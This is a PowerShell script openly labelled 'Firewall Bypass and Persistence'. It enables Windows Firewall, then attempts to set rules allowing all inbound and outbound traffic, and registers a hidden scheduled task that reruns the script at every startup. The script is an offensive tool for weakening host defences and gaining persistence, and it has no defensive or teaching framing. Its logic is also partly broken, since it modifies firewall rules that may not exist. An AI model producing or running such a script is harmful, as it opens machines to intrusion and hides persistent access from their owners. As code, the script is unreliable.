# Objective:
# This script performs Firewall Bypass and Persistence by modifying the Windows Firewall and creating a scheduled task.

# Import the necessary modules
Import-Module NetSecurity
Import-Module ScheduledTasks

# Enable Firewall for all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Allow all traffic through the firewall
Set-NetFirewallRule -DisplayName "Allow All Inbound Traffic" -Direction Inbound -Action Allow
Set-NetFirewallRule -DisplayName "Allow All Outbound Traffic" -Direction Outbound -Action Allow

# Create a scheduled task to run the script on startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $PSCommandPath"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
$task | Register-ScheduledTask -TaskName "Firewall Bypass" -Description "Firewall Bypass and Persistence"

# Notify the user that the script has completed
Write-Host "Firewall Bypass and Persistence completed."